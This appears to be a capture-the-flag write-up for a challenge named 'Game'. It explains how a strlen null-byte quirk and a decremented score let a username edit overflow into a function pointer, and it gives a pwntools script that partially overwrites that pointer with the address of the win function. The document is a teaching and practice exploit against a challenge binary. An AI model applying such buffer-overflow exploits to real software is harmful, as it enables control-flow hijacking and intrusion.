# Game

The whole challenge is about the strlen vulnerability, that function in fact returns the length of the string which is nothing more than the length up until the first null byte.

First we need the username to be exaclty 16 bytes long, after that we just want to lose 1 time to the play function, which decreases the score variable, situated right after the username buffer.

```c
//something like this
*(buff+16)--;
```

The integer representation of -1 is 0xFFFFFFFF, anything different from nullbyte will do the trick.

We can then edit the username from the menu and just overflow until the function pointer, overwriting its last 2 bytes with the last 2 bytes of the win function.

```py
p.recvuntil(b'Name: ')
p.send(b'A'*16)

play()

fill_saves()

p.recvuntil(b'> ')
p.sendline(b'3')

p.send(b'\xFF'*24+p64(e.symbols['win'])[:2])


p.interactive()
```
